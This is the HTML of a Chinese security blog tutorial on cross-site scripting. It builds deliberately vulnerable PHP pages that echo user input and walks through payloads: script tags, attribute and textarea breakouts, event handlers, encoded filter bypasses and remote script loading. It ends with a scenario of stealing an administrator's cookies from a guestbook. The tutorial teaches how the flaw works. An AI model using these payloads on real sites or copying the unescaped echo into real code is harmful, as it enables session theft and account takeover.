@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>xss原理分析 | 小瑞安全博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="xss原理分析 0×01 前言: XSS的原理分析与解剖">
+<meta name="keywords" content="渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss原理分析">
+<meta property="og:url" content="http://www.hackerui.me/2017/05/09/xss原理分析/index.html">
+<meta property="og:site_name" content="小瑞安全博客">
+<meta property="og:description" content="xss原理分析 0×01 前言: XSS的原理分析与解剖">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss.jpg">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss1.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss2.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss3.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss4.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss5.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss6.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss7.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss8.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss9.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss10.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss11.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss12.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss13.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss14.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss15.png">
+<meta property="og:image" content="http://www.hackerui.me/images/xss/xss16.png">
+<meta property="og:updated_time" content="2017-05-09T05:40:15.965Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss原理分析">
+<meta name="twitter:description" content="xss原理分析 0×01 前言: XSS的原理分析与解剖">
+<meta name="twitter:image" content="http://www.hackerui.me/images/xss/xss.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="小瑞安全博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">小瑞安全博客</h2>
+    <h3 class="description">null</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>3</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-xss原理分析" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/05/09/xss原理分析/" class="article-date">
+  <time class="post-time" datetime="2017-05-09T05:12:11.000Z" itemprop="datePublished">
+    <span class="post-month">5月</span><br/>
+    <span class="post-day">09</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      xss原理分析
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>xss原理分析
+</code></pre><p><img src="/images/xss/xss.jpg" alt=""><br>0×01 前言:</p>
+<p>XSS的原理分析与解剖<br><a id="more"></a><br>《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。</p>
+<p>我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：</p>
+<p>1、耗时间<br>2、有一定几率不成功<br>3、没有相应的软件来完成自动化攻击<br>4、前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底<br>5、是一种被动的攻击手法<br>6、对website有http-only、crossdomian.xml没有用<br>但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个。</p>
+<p>Xss几乎每个网站都存在，google、baidu、360等都存在。</p>
+<p>0×02 原理:</p>
+<p>首先我们现在本地搭建个PHP环境(可以使用phpstudy安装包安装)，然后在index.php文件里写入如下代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </div><div class="line">&lt;title&gt;XSS原理重现&lt;/title&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </div><div class="line">&lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt; </div><div class="line">&lt;input type=&quot;submit&quot;&gt; </div><div class="line">&lt;/form&gt; </div><div class="line">&lt;hr&gt; </div><div class="line">&lt;?php </div><div class="line">$xss = $_GET[&apos;xss_input&apos;];  </div><div class="line">echo &apos;你输入的字符为&lt;br&gt;&apos;.$xss;  </div><div class="line">?&gt; </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>然后，你会在页面看到这样的页面</p>
+<p><img src="/images/xss/xss1.png" alt=""></p>
+<p>我们试着输入abcd123，得到的结果为</p>
+<p><img src="/images/xss/xss2.png" alt=""></p>
+<p>我们在看看源代码</p>
+<p><img src="/images/xss/xss3.png" alt=""></p>
+<p>我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入下面的代码会出现什么呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>如果按照上面的例子来说，它应该存在第12行的[br]与[/boby]&gt;之间，变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;br&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;/boby&gt;</div></pre></td></tr></table></figure></p>
+<p>之后，应该会弹出对话框。</p>
+<p>既然假设提出来，那我们来实现下这个假设成不成立吧。</p>
+<p>我们输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>得到的页面为</p>
+<p><img src="/images/xss/xss4.png" alt=""></p>
+<p>成功弹窗，这个时候基本上就可以确定存在xss漏洞。</p>
+<p>我们在看看源代码</p>
+<p><img src="/images/xss/xss5.png" alt=""></p>
+<p>看来，我们的假设成功了，这节就说说XSS的原理，下面几节说说xss的构造和利用。</p>
+<p>0×03 xss利用输出的环境来构造代码 :</p>
+<p>上节说了xss的原理，但是我们的输出点不一在[ br ]和[ /boby ]里，可以出现在html标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入下面代码就会出现弹窗。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>先贴出代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </div><div class="line">&lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">&lt;center&gt; </div><div class="line">&lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt; </div><div class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </div><div class="line">&lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; </div><div class="line">&lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br&gt; </div><div class="line">&lt;input type=&quot;submit&quot;&gt; </div><div class="line">&lt;/form&gt; </div><div class="line">&lt;hr&gt; </div><div class="line">&lt;?php </div><div class="line">$xss = $_GET[&apos;xss_input_value&apos;];  </div><div class="line">if(isset($xss))&#123;  </div><div class="line">echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$xss.&apos;&quot;&gt;&apos;;  </div><div class="line">&#125;else&#123;  </div><div class="line">echo &apos;&lt;input type=&quot;type&quot; value=&quot;输出&quot;&gt;&apos;;  </div><div class="line">&#125;  </div><div class="line">?&gt; </div><div class="line">&lt;/center&gt; </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>下面是代码的页面</p>
+<p><img src="/images/xss/xss6.png" alt=""></p>
+<p>这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入下面的代码来测试)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/images/xss/xss7.png" alt=""><br><img src="/images/xss/xss8.png" alt=""></p>
+<p>明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码</p>
+<p><img src="/images/xss/xss9.png" alt=""></p>
+<p>我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&amp;#039;xss&amp;#039;)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>前面加个”&gt;来闭合input标签。所以应该得到的结果为</p>
+<p><img src="/images/xss/xss10.png" alt=""></p>
+<p>成功弹窗了，我们在看看这时的页面</p>
+<p><img src="/images/xss/xss11.png" alt=""></p>
+<p>看到后面有第二个input输入框后面跟有”&gt;字符串，为什么会这样呢，我们来看看源代码</p>
+<p><img src="/images/xss/xss12.png" alt=""></p>
+<p>这时可以看到我们构造的代码里面有两个”&gt;，第一个”&gt;是为了闭合input标签，所以第二个”&gt;就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？</p>
+<p>这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。</p>
+<p>还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码 我们可以写成</p>
+<p>“ onclick=”alert(&#039;xss&#039;)<br>这时，我们在来试试，页面会发生什么样的变化吧。</p>
+<p><img src="/images/xss/xss13.png" alt=""></p>
+<p>没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行alert(&#039;xss&#039;)代码。我们来试试看</p>
+<p><img src="/images/xss/xss14.png" alt=""></p>
+<p>当我点击后，就出现了弹窗，这时我们来看看源代码吧</p>
+<p><img src="/images/xss/xss15.png" alt=""></p>
+<p>第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成</p>
+<p>Onmousemove 当鼠标移动就触发</p>
+<p>Onload 当页面加载完成后触发</p>
+<p>还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。</p>
+<p>别以为就这样结束了，还有一类环境不能用上述的方法，</p>
+<p>那就是如果在[ textarea ]标签里呢？！或者其他优先级比script高的呢？</p>
+<p>就下面这样</p>
+<p><img src="/images/xss/xss16.png" alt=""></p>
+<p>这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入下面的代码就可以实现弹窗了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/textarea&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>0×04 过滤的解决办法</p>
+<p>假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;img scr=1 onerror=alert(&apos;xss&apos;)&gt;当找不到图片名为1的文件时，执行alert(&apos;xss&apos;)  </div><div class="line">&lt;a href=javascrip:alert(&apos;xss&apos;)&gt;s&lt;/a&gt; 点击s时运行alert(&apos;xss&apos;)  </div><div class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);height=0 width=0 /&gt;&lt;iframe&gt;利用iframe的scr来弹窗  </div><div class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;过滤了alert来执行弹窗</div></pre></td></tr></table></figure></p>
+<p>等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还有管他…)</p>
+<p>0×05 xss的利用</p>
+<p>说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。</p>
+<p>这时我们要插入js代码了，怎么插呢？</p>
+<p>你可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script scr=&quot;js_url&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>也可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=x onerror=appendChild(createElement(&apos;script&apos;)).src=&apos;js_url&apos; /&gt;</div></pre></td></tr></table></figure></p>
+<p>各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？</p>
+<p>Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。</p>
+<p>比如我们在网站的留言区输入下面的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script scr=&quot;js_url&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。</p>
+<p>至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。</p>
+<p>有兴趣的朋友，下面是cn4rry给我的几个xss平台，大家可以自己钻研与研究，也可以自己搭建</p>
+<p><a href="http://pan.baidu.com/s/1ntqOp4X" target="_blank" rel="external">http://pan.baidu.com/s/1ntqOp4X</a></p>
+<p>在发布此文章的时候，我特地和cn4rry谈了一下，得到的结果是，我会继续写这个系列的。当我把这个doc发给cn4rry的时候，他就直接来句“嗯 写的比较基础”，我本来的打算是写一个xss入门的就可以了，我只是感觉 现在网上的文章从简单开始介绍xss的比较少，都是在书里有</p>
+<p>所以 我想在网上把他讲的细点 xss入门就可以了，后面的路 就可以自己摸索了</p>
+<p>但是和他谈过后，感觉还是要继续写下去，因为“xss盲打”“xss编码绕过”“fuzzing xss”等等，如果是自己慢慢琢磨的话，需要较长的时间，所以我打算每过一段时间就会推出下一个xss的文章，写个系列出来。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.hackerui.me/2017/05/09/xss原理分析/" data-id="cj2h42f9x0008gwzdo7qzg28a" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/05/09/手工注入/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          手工注入
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">小瑞安全博客</h1>
+    <h2 class="blog-subtitle">喜欢安全的95后苦逼青年！</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">小瑞安全博客</h2>
+    <h3 class="description">null</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>3</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/5279314/" target="_blank" title="Github">
+          Github
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://wp.qq.com/email/stop/email_stop.html?qq=1767361332" target="_blank" title="QQ">
+          QQ
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://www.hackerui.me/" target="_blank" title="个人博客">
+          个人博客
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2016 - 2017 小瑞安全博客<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
+          
+            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
